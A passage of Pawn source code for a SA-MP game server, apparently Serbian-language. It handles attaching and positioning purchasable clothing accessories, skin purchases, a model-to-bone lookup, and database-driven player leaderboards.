					SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, clothes_info[ playerid ][ x_slot_1_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_1_model ]),
																		clothes_info[ playerid ][ x_slot_1_pos ][ 0 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 1 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 2 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 3 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 4 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 5 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 6 ],
																		clothes_info[ playerid ][ x_slot_1_pos ][ 7 ],
			     														clothes_info[ playerid ][ x_slot_1_pos ][ 8 ], 0, 0);
	            }
	            case 1:
				{
					clothes_info[ playerid ][ x_slot_2_pos ][ 0 ] = fOffsetX;
					clothes_info[ playerid ][ x_slot_2_pos ][ 1 ] = fOffsetY;
					clothes_info[ playerid ][ x_slot_2_pos ][ 2 ] = fOffsetZ;
					clothes_info[ playerid ][ x_slot_2_pos ][ 3 ] = fRotX;
					clothes_info[ playerid ][ x_slot_2_pos ][ 4 ] = fRotY;
					clothes_info[ playerid ][ x_slot_2_pos ][ 5 ] = fRotZ;
					clothes_info[ playerid ][ x_slot_2_pos ][ 6 ] = fScaleX;
					clothes_info[ playerid ][ x_slot_2_pos ][ 7 ] = fScaleY;
					clothes_info[ playerid ][ x_slot_2_pos ][ 8 ] = fScaleZ;

					SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, clothes_info[ playerid ][ x_slot_2_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_2_model ]),
																		clothes_info[ playerid ][ x_slot_2_pos ][ 0 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 1 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 2 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 3 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 4 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 5 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 6 ],
																		clothes_info[ playerid ][ x_slot_2_pos ][ 7 ],
			     														clothes_info[ playerid ][ x_slot_2_pos ][ 8 ], 0, 0);
	            }
	            case 2:
				{
					clothes_info[ playerid ][ x_slot_3_pos ][ 0 ] = fOffsetX;
					clothes_info[ playerid ][ x_slot_3_pos ][ 1 ] = fOffsetY;
					clothes_info[ playerid ][ x_slot_3_pos ][ 2 ] = fOffsetZ;
					clothes_info[ playerid ][ x_slot_3_pos ][ 3 ] = fRotX;
					clothes_info[ playerid ][ x_slot_3_pos ][ 4 ] = fRotY;
					clothes_info[ playerid ][ x_slot_3_pos ][ 5 ] = fRotZ;
					clothes_info[ playerid ][ x_slot_3_pos ][ 6 ] = fScaleX;
					clothes_info[ playerid ][ x_slot_3_pos ][ 7 ] = fScaleY;
					clothes_info[ playerid ][ x_slot_3_pos ][ 8 ] = fScaleZ;

					SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, clothes_info[ playerid ][ x_slot_3_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_3_model ]),
																		clothes_info[ playerid ][ x_slot_3_pos ][ 0 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 1 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 2 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 3 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 4 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 5 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 6 ],
																		clothes_info[ playerid ][ x_slot_3_pos ][ 7 ],
			     														clothes_info[ playerid ][ x_slot_3_pos ][ 8 ], 0, 0);
	            }
	            case 3:
				{
					clothes_info[ playerid ][ x_slot_4_pos ][ 0 ] = fOffsetX;
					clothes_info[ playerid ][ x_slot_4_pos ][ 1 ] = fOffsetY;
					clothes_info[ playerid ][ x_slot_4_pos ][ 2 ] = fOffsetZ;
					clothes_info[ playerid ][ x_slot_4_pos ][ 3 ] = fRotX;
					clothes_info[ playerid ][ x_slot_4_pos ][ 4 ] = fRotY;
					clothes_info[ playerid ][ x_slot_4_pos ][ 5 ] = fRotZ;
					clothes_info[ playerid ][ x_slot_4_pos ][ 6 ] = fScaleX;
					clothes_info[ playerid ][ x_slot_4_pos ][ 7 ] = fScaleY;
					clothes_info[ playerid ][ x_slot_4_pos ][ 8 ] = fScaleZ;

					SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, clothes_info[ playerid ][ x_slot_4_model ], GetBoneByModelID(clothes_info[ playerid ][ x_slot_4_model ]),
																		clothes_info[ playerid ][ x_slot_4_pos ][ 0 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 1 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 2 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 3 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 4 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 5 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 6 ],
																		clothes_info[ playerid ][ x_slot_4_pos ][ 7 ],
			     														clothes_info[ playerid ][ x_slot_4_pos ][ 8 ], 0, 0);
	            }
	        }

            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;

            sql_user_update_clothes( playerid );

            EditingBody[ playerid ] = false;
        }
    }
	//------------------------
	if( !response )
	{
	    if( EditingBody[ playerid ] )
		{
	    	switch( (chosen_clothes_slot[ playerid ]-1) )
			{
                case 0:
				{
                	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_1 );
                }
                case 1:
				{
                	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_2 );
                }
                case 2:
				{
                	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_3 );
                }
            	case 3:
				{
                	RemovePlayerAttachedObject( playerid, OBJECT_SLOT_4 );
            	}
            }
            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = false;

            EditingBody[ playerid ] = false;
	    }
	}
    return 1;
}
//------------------------------------------------------------------------------
public OnModelSelectionResponse(playerid, extraid, index, modelid, response)
{
	switch(extraid)
	{
		case MENU_SKIN:
		{
			if(!response) return 1;

			if( modelid == 120 || modelid == 294 || modelid == 0 || modelid == 74 )
			{
                SendErrorMessage( playerid, "Taj skine je zabranjen za kupovinu." );
                return 1;
			}

			if( PlayerInfo[ playerid ][ xVIPLevel ] >= 2 || PlayerInfo[ playerid ][ xAdmin ] >= 1 && uFirmi[ playerid ] == -1 )
			{
                if( modelid == GetPlayerSkin( playerid ) ) return SendErrorMessage(playerid, "Vec imas to odelo.");

				if(PlayerInfo[ playerid ][ xAdmin ] >= 1)
				{
					PostaviIgracuSkin( playerid, modelid );
					SMG_SetPlayerSkin( playerid, modelid );
				}
				else
				{
					SMG_SetPlayerSkin( playerid, modelid );
				}

               	SendClientMessage( playerid, CRVENA, "(ODECA): Promenili ste odelo." );
			}
            else
			{
                if( uFirmi[ playerid ] != -1 )
				{
                    if( PlayerInfo[ playerid ][ xClan ] != 0 ) return SendErrorMessage( playerid, "Ne mozete kupiti skin jer ste u organizaciji." );
            		if( PlayerInfo[ playerid ][ xNovac ] < 500 ) return SendErrorMessage( playerid, "Nemate dovoljno novca(500$)." );

	                SendClientMessage( playerid, CRVENA, "(ODECA): Kupili ste skin za $500. (/odeca da sredis odecu ako imas).");
		            PostaviIgracuSkin( playerid, modelid );
		            SMG_SetPlayerSkin( playerid, modelid );
		            DajIgracuNovac( playerid, -500 );
					BussinesMoney( uFirmi[ playerid ], 500, true );
				}
				else SendErrorMessage( playerid, "Morate biti u firmi." );
            }
		}
		case MENU_GLASSES:
		{
			if(!response) return 1;

			if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, modelid, 2, 0.10, 0.03, 0, 0, 90, 90, 1.2, 1.2, 1.4 );

		        clothes_info[ playerid ][ x_slot_1_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_1);
		        chosen_clothes_slot[ playerid ] = 1;
		    }
		    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, modelid, 2, 0.10, 0.03, 0, 0, 90, 90, 1.2, 1.2, 1.4 );

		        clothes_info[ playerid ][ x_slot_2_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_2);
		        chosen_clothes_slot[ playerid ] = 2;
		    }
		    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, modelid, 2, 0.10, 0.03, 0, 0, 90, 90, 1.2, 1.2, 1.4 );

		        clothes_info[ playerid ][ x_slot_3_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_3);
		        chosen_clothes_slot[ playerid ] = 3;
		    }
		    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, modelid, 2, 0.10, 0.03, 0, 0, 90, 90, 1.2, 1.2, 1.4 );

		        clothes_info[ playerid ][ x_slot_4_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_4);
		        chosen_clothes_slot[ playerid ] = 4;
		    }
			else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

            EditingBody[ playerid ] = true;
            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;

			DajIgracuNovac( playerid, -400 ); 
			BussinesMoney( uFirmi[ playerid ], 400, true);
		}
		case MENU_FBANDANAS:
		{
			if(!response) return 1;

			if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, modelid, 2, 0.09, 0.02, -0.01, -90, 0, -90, 1.15, 1.15, 1.15 );

		        clothes_info[ playerid ][ x_slot_1_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_1);
		        chosen_clothes_slot[ playerid ] = 1;
		    }
		    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, modelid, 2, 0.09, 0.02, -0.01, -90, 0, -90, 1.15, 1.15, 1.15 );

		        clothes_info[ playerid ][ x_slot_2_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_2);
		        chosen_clothes_slot[ playerid ] = 2;
		    }
		    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, modelid, 2, 0.09, 0.02, -0.01, -90, 0, -90, 1.15, 1.15, 1.15 );

		        clothes_info[ playerid ][ x_slot_3_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_3);
		        chosen_clothes_slot[ playerid ] = 3;
		    }
		    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, modelid, 2, 0.09, 0.02, -0.01, -90, 0, -90, 1.15, 1.15, 1.15 );

		        clothes_info[ playerid ][ x_slot_4_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_4);
		        chosen_clothes_slot[ playerid ] = 4;
		    }
			else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

            EditingBody[ playerid ] = true;
            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;
 
			DajIgracuNovac( playerid, -500 ); 
			BussinesMoney( uFirmi[ playerid ], 500, true);
		}
		case MENU_MASKS:
		{
			if(!response) return 1;

			if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, modelid, 2, 0.12, 0.01 ,0, -90, 0, -90, 1.2, 1.2, 1.1 );

		        clothes_info[ playerid ][ x_slot_1_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_1);
		        chosen_clothes_slot[ playerid ] = 1;
		    }
		    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, modelid, 2, 0.12, 0.01 ,0, -90, 0, -90, 1.2, 1.2, 1.1 );

		        clothes_info[ playerid ][ x_slot_2_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_2);
		        chosen_clothes_slot[ playerid ] = 2;
		    }
		    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
			{
		       	SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, modelid, 2, 0.12, 0.01 ,0, -90, 0, -90, 1.2, 1.2, 1.1 );

		        clothes_info[ playerid ][ x_slot_3_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_3);
		        chosen_clothes_slot[ playerid ] = 3;
		    }
		    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, modelid, 2, 0.12, 0.01 ,0, -90, 0, -90, 1.2, 1.2, 1.1 );

		        clothes_info[ playerid ][ x_slot_4_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_4);
		        chosen_clothes_slot[ playerid ] = 4;
		    }
			else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

            EditingBody[ playerid ] = true;
            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;

			DajIgracuNovac( playerid, -500 ); 
			BussinesMoney( uFirmi[ playerid ], 500, true);
		}
		case MENU_CAPS:
		{
			if(!response) return 1;

			if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, modelid, 2,0.15,0.02,-0.01,0,0,0,1.3,1.2,1.3);

		        clothes_info[ playerid ][ x_slot_1_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_1);
		        chosen_clothes_slot[ playerid ] = 1;
		    }
		    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, modelid, 2,0.15,0.02,-0.01,0,0,0,1.3,1.2,1.3);

		        clothes_info[ playerid ][ x_slot_2_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_2);
		        chosen_clothes_slot[ playerid ] = 2;
		    }
		    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, modelid, 2,0.15,0.02,-0.01,0,0,0,1.3,1.2,1.3);

		        clothes_info[ playerid ][ x_slot_3_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_3);
		        chosen_clothes_slot[ playerid ] = 3;
		    }
		    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, modelid, 2,0.15,0.02,-0.01,0,0,0,1.3,1.2,1.3);

		        clothes_info[ playerid ][ x_slot_4_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_4);
		        chosen_clothes_slot[ playerid ] = 4;
		    }
			else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

			EditingBody[ playerid ] = true;
            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;

			DajIgracuNovac( playerid, -700 ); 
			BussinesMoney( uFirmi[ playerid ], 700, true);
		}
		case MENU_HATS:
		{
			if(!response) return 1;

			if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, modelid, 2,0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_1_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_1);
		        chosen_clothes_slot[ playerid ] = 1;
		    }
		    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, modelid, 2,0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_2_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_2);
		        chosen_clothes_slot[ playerid ] = 2;
		    }
		    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, modelid, 2,0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_3_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_3);
		        chosen_clothes_slot[ playerid ] = 3;
		    }
		    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, modelid, 2,0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_4_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_4);
		        chosen_clothes_slot[ playerid ] = 4;
		    }
			else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

            EditingBody[ playerid ] = true;
            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;

			DajIgracuNovac( playerid, -600 );
			BussinesMoney( uFirmi[ playerid ], 600, true);
		}
		//
		case MENU_GOV_ARMVEST:
		{
			if(!response) return 1;

			if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, modelid, 1, 0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_1_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_1);
		        chosen_clothes_slot[ playerid ] = 1;
		    }
		    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, modelid, 1, 0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_2_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_2);
		        chosen_clothes_slot[ playerid ] = 2;
		    }
		    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, modelid, 1, 0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_3_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_3);
		        chosen_clothes_slot[ playerid ] = 3;
		    }
		    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, modelid, 1, 0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_4_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_4);
		        chosen_clothes_slot[ playerid ] = 4;
		    }
			else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

            EditingBody[ playerid ] = true;
            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;
		}
		case MENU_GOV_HATCAPHELMET:
		{
			if(!response) return 1;

			if( clothes_info[ playerid ][ x_slot_1_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_1, modelid, 2, 0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_1_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_1);
		        chosen_clothes_slot[ playerid ] = 1;
		    }
		    else if( clothes_info[ playerid ][ x_slot_2_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_2, modelid, 2, 0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_2_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_2);
		        chosen_clothes_slot[ playerid ] = 2;
		    }
		    else if( clothes_info[ playerid ][ x_slot_3_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_3, modelid, 2, 0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_3_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_3);
		        chosen_clothes_slot[ playerid ] = 3;
		    }
		    else if( clothes_info[ playerid ][ x_slot_4_model ] == -1 )
			{
		        SetPlayerAttachedObject( playerid, OBJECT_SLOT_4, modelid, 2, 0.14,0.01,-0.01,0,0,0,1.2,1.2,1.2);

		        clothes_info[ playerid ][ x_slot_4_model ] = modelid;
		        EditAttachedObject( playerid, OBJECT_SLOT_4);
		        chosen_clothes_slot[ playerid ] = 4;
		    }
			else return SendErrorMessage( playerid, "Svi slotovi su vam zauzeti." );

            EditingBody[ playerid ] = true;
            object_on_player[ playerid ][ chosen_clothes_slot[ playerid ]-1 ] = true;
		}
	}
	return 1;
}
//------------------------------------------------------------------------------
GetBoneByModelID(modelid)
{
	switch(modelid)
	{
		case 0: return 1;
        case 19006 .. 19035: return 2;
        case 18912 .. 18920: return 2;
        case 18891 .. 18910, 11704, 19137: return 2;
        case 18939 .. 18943, 19065, 19330, 19331, 19554, 19558: return 2;
        case 19067 .. 19069, 18926..18935, 19093, 19160, 18944..18951, 19352, 19487, 19488, 19528, 19553, 18967: return 2;
        case 19142, 19515: return 1;
        case 19520, 19521, 19099, 19161: return 2;
        case 19141, 19200: return 2;
        case 19904: return 1;
        case 19942: return 0;
        case 18637: return 5;
        default: return 2;
	}
	return 1;
}
//------------------------------------------------------------------------------
_:public showTopList(playerid, list)
{
	switch(list)
	{
		case 0:
		{
			//level
			new rows, 
		    	fields, 
		    	p_name[ 24 ], 
		    	last_login[ 22 ], 
		    	levell, 
		    	is_online;

		    cache_get_data( rows, fields, mSQL );

		    if( rows )
			{
		        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Level\t{FFFFFF}Online\n" );

		        for( new i = 0; i < rows; i++ )
				{
		            levell = cache_get_field_content_int( i, "level" );
		            is_online = cache_get_field_content_int( i, "isonline" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            if( is_online == 0 )
					{
						cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

						format( globalstring, 150, "{FFFFFF}%s\t%d\t{FF0000}%s\n", p_name, levell, last_login );
						strcat( DialogStrgEx, globalstring );
					}
					else
					{
						new id = GetPlayerIdFromName(p_name);

		            	format( globalstring, 150, "{FFFFFF}[%d] %s%s\t%d\t{00FF00}Online\n", id, (id == playerid) ? ("{4282C0}") : ("{FFFFFF}"), p_name, levell);
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista najvecih levela:", DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    }
		    else SendErrorMessage( playerid, "Nema kreiranih accounta u bazi." );
		}
		case 1:
		{
			//sati igre
			new rows, 
		    	fields, 
		    	p_name[ 24 ], 
		    	last_login[ 22 ], 
		    	hourss, 
		    	is_online;

		    cache_get_data( rows, fields, mSQL );

		    if( rows )
			{
		        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Hours\t{FFFFFF}Online\n" );

		        for( new i = 0; i < rows; i++ )
				{
		            hourss = cache_get_field_content_int( i, "xOnlineSati" );
		            is_online = cache_get_field_content_int( i, "isonline" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            if( is_online == 0 )
					{
						cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

						format( globalstring, 150, "{FFFFFF}%s\t%sh\t{FF0000}%s\n", p_name, fNumber(hourss), last_login );
						strcat( DialogStrgEx, globalstring );
					}
					else
					{
						new id = GetPlayerIdFromName(p_name);

		            	format( globalstring, 150, "{FFFFFF}[%d] %s%s\t%sh\t{00FF00}Online\n", id, (id == playerid) ? ("{4282C0}") : ("{FFFFFF}"), p_name, fNumber(hourss));
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista najaktivnijih:", DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    }
		    else SendErrorMessage( playerid, "Nema kreiranih accounta u bazi." );
		}
		case 2:
		{
			//money
			new rows, 
		    	fields, 
		    	p_name[ 24 ], 
		    	last_login[ 22 ], 
		    	cashh,  
		    	bankk, 
		    	is_online;

		    cache_get_data( rows, fields, mSQL );

		    if( rows )
			{
		        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Money\t{FFFFFF}Online\n" );

		        for( new i = 0; i < rows; i++ )
				{
		            cashh = cache_get_field_content_int( i, "money" );
		            bankk = cache_get_field_content_int( i, "xBRacun" );
		            is_online = cache_get_field_content_int( i, "isonline" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            if( is_online == 0 )
					{
						cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

						format( globalstring, 150, "{FFFFFF}%s\t$%s\t{FF0000}%s\n", p_name, fNumber(cashh+bankk), last_login );
						strcat( DialogStrgEx, globalstring );
					}
					else
					{
						new id = GetPlayerIdFromName(p_name);

		            	format( globalstring, 150, "{FFFFFF}[%d] %s%s\t$%s\t{00FF00}Online\n", id, (id == playerid) ? ("{4282C0}") : ("{FFFFFF}"), p_name, fNumber(cashh+bankk));
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista najbogatijih:", DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    }
		    else SendErrorMessage( playerid, "Nema kreiranih accounta u bazi." );
		}
		case 3:
		{
			//gold
			new rows, 
		    	fields, 
		    	p_name[ 24 ], 
		    	last_login[ 22 ], 
		    	cashh,
		    	is_online;

		    cache_get_data( rows, fields, mSQL );

		    if( rows )
			{
		        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Gold\t{FFFFFF}Online\n" );

		        for( new i = 0; i < rows; i++ )
				{
		            cashh = cache_get_field_content_int( i, "xZlato" );
		            is_online = cache_get_field_content_int( i, "isonline" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            if( is_online == 0 )
					{
						cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

						format( globalstring, 150, "{FFFFFF}%s\t%sg\t{FF0000}%s\n", p_name, fNumber(cashh), last_login );
						strcat( DialogStrgEx, globalstring );
					}
					else
					{
						new id = GetPlayerIdFromName(p_name);

		            	format( globalstring, 150, "{FFFFFF}[%d] %s%s\t%sg\t{00FF00}Online\n", id, (id == playerid) ? ("{4282C0}") : ("{FFFFFF}"), p_name, fNumber(cashh));
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista najbogatijih(zlato):", DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    }
		    else SendErrorMessage( playerid, "Nema kreiranih accounta u bazi." );
		}
		case 4:
		{
			//dm
			new rows, 
		    	fields, 
		    	p_name[ 24 ], 
		    	last_login[ 22 ], 
		    	hourss, 
		    	is_online;

		    cache_get_data( rows, fields, mSQL );

		    if( rows )
			{
		        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Kills\t{FFFFFF}Online\n" );

		        for( new i = 0; i < rows; i++ )
				{
		            hourss = cache_get_field_content_int( i, "dm_event_kills" );
		            is_online = cache_get_field_content_int( i, "isonline" );
		            cache_get_field_content( i, "p_name", p_name, mSQL, 24 );

		            if( is_online == 0 )
					{
						cache_get_field_content( i, "last_login", last_login, mSQL, 22 );

						format( globalstring, 150, "{FFFFFF}%s\t%d\t{FF0000}%s\n", p_name, hourss, last_login );
						strcat( DialogStrgEx, globalstring );
					}
					else
					{
						new id = GetPlayerIdFromName(p_name);

		            	format( globalstring, 150, "{FFFFFF}[%d] %s%s\t%d\t{00FF00}Online\n", id, (id == playerid) ? ("{4282C0}") : ("{FFFFFF}"), p_name, hourss);
						strcat( DialogStrgEx, globalstring );
					}
				}
				ShowPlayerDialog( playerid, 0, DIALOG_STYLE_TABLIST_HEADERS, "{FFFFFF}Lista najsmrtonosnijih(DM):", DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		    }
		    else SendErrorMessage( playerid, "Nema kreiranih accounta u bazi." );
		}
		case 5:
		{
			//tdm
			new rows, 
		    	fields, 
		    	p_name[ 24 ], 
		    	last_login[ 22 ], 
		    	hourss, 
		    	is_online;

		    cache_get_data( rows, fields, mSQL );

		    if( rows )
			{
		        strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
		        strcat( DialogStrgEx, "{FFFFFF}Name\t{FFFFFF}Kills\t{FFFFFF}Online\n" );

		        for( new i = 0; i < rows; i++ )
				{
		            hourss = cache_get_field_content_int( i, "cstdm_score" );
		            is_online = cache_get_field_content_int( i, "isonline" );
